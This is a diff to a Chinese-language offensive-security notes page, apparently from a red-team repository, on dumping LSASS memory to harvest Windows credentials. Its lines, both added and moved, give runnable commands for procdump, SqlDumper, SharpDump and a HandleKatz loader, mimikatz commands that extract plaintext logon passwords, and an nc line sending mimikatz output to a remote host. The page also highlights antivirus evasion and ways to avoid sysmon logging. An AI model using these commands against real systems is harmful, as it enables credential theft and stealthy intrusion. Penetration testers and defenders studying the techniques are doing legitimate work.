@@ -138,32 +138,6 @@ vault::cred /patch
 - [Mimikatz Against Virtual Machine Memory Part 1 Carnal0wnage](https://blog.carnal0wnage.com/2014/05/mimikatz-against-virtual-machine-memory.html)
 - [Mimikatz Against Virtual Machine Memory Part 2 Carnal0wnage](https://blog.carnal0wnage.com/2014/06/mimikatz-against-virtual-machine-memory.html)
 
-**[SharpDump](https://github.com/GhostPack/SharpDump)** c# 免杀抓明文
-
-在管理员权限下运行生成 debug480.bin
-
-特别注意,dump 的文件默认是 bin 后缀,拖到本地机器以后,需要自行把 bin 重命名为 zip 的后缀,然后正常解压出里面的文件,再丢给 mimikatz 去读取即可,如下
-
-mimikatz 加载 dump 文件
-```bash
-sekurlsa::minidump debug480
-sekurlsa::logonPasswords full
-```
-
-还有一些工具
-- SqlDumper
-    ```bash
-    tasklist /svc | findstr lsass.exe  # 查看lsass.exe 的PID号
-    # 或powershell 下
-    Get-Process lsass
-
-    Sqldumper.exe ProcessID 0 0x01100  # 导出mdmp文件
-    ```
-
-**WerFault.exe**
-
-- [deepinstinct/LsassSilentProcessExit](https://github.com/deepinstinct/LsassSilentProcessExit)
-
 **远程传输**
 
 输出传输到远程机器
@@ -192,8 +166,10 @@ nc.exe -vv 192.168.1.2 443 -e mimikatz.exe
 
 ### ProcDump
 
+- https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump
+
 procdump 是微软的官方工具，不会被杀，所以如果你的 mimikatz 不免杀，可以用 procdump 导出 lsass.dmp 后拖回本地抓取密码来规避杀软。
-```bash
+```
 Procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
 
@@ -208,6 +184,30 @@ procdump -accepteula -ma 640 lsass.dmp
 sekurlsa::minidump c:\users\test\appdata\local\temp\lsass.dmp
 sekurlsa::logonpasswords full
 ```
+
+### SharpDump
+
+- [SharpDump](https://github.com/GhostPack/SharpDump)
+
+在管理员权限下运行生成 debug480.bin
+
+特别注意,dump 的文件默认是 bin 后缀,拖到本地机器以后,需要自行把 bin 重命名为 zip 的后缀,然后正常解压出里面的文件,再丢给 mimikatz 去读取即可,如下
+
+mimikatz 加载 dump 文件
+```bash
+sekurlsa::minidump debug480
+sekurlsa::logonPasswords full
+```
+
+还有一些工具
+- SqlDumper
+    ```bash
+    tasklist /svc | findstr lsass.exe  # 查看lsass.exe 的PID号
+    # 或powershell 下
+    Get-Process lsass
+
+    Sqldumper.exe ProcessID 0 0x01100  # 导出mdmp文件
+    ```
 
 ### ComSvcs.dll
 
@@ -265,9 +265,20 @@ Bin2Dmp.exe "Windows Server 2008 x64.vmem" win2k8.dmp
 
 ![](../../../assets/img/Security/安全工具/mimikatz/11.png)
 
+### LsassSilentProcessExit
+
+- [deepinstinct/LsassSilentProcessExit](https://github.com/deepinstinct/LsassSilentProcessExit) - 通过 SilentProcessExit 转储 LSASS
+
 ### LSASS Shtinkering
 
-- https://github.com/deepinstinct/Lsass-Shtinkering
+- [deepinstinct/Lsass-Shtinkering](https://github.com/deepinstinct/Lsass-Shtinkering) - 滥用 Windows 错误报告服务转储 LSASS 的新方法
+
+### HandleKatz
+
+- [codewhitesec/HandleKatz](https://github.com/codewhitesec/HandleKatz) - 使用完全与位置无关的代码来实现了转储lsass的功能。该工具通过自己实现 PIC，不需要修改从定位表，只需要使用 .text 段，避免了全局变量或者静态变量的使用，并且还可以减少在 sysmon even 产生的日志。还通过 NtDuplicateObject 函数克隆其他已经有 lsass 进程的 handle 来绕过 sysmon 产生进程打开时的 ProcessAccess 事件。
+    ```
+    loader.exe --pid:7331 --outfile:C:\Temp\dump.obfuscated
+    ```
 
 ---
 
